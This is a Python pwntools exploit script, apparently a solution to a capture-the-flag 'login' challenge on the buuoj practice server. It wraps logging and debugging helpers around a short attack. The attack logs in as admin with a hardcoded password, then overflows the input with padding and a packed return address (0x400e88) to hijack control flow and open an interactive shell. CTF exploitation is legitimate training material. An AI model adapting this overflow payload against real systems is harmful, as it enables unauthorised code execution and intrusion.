from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'login'
port = 29660

###########修改宏###########
DEBUG = 0
LOG_PRINT = 1
TMUX = 1
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    stop_count = -1
    def STOP(idx=0):
        global stop_count
        stop_count += 1
        input('stop{}...... ===> {}'.format(stop_count, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x400A4A\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    def STOP(idx=0):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libs))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
堆溢出
'''
# admin
# 2jctf_pa5sw0rd
io.recv()
io.sendline(b'admin')
io.recv()
io.sendline(b'2jctf_pa5sw0rd\x00' + b'\x00' * 10 +  b'a' * 0x2f + p64(0x400e88))
# 0x400e88
io.interactive()
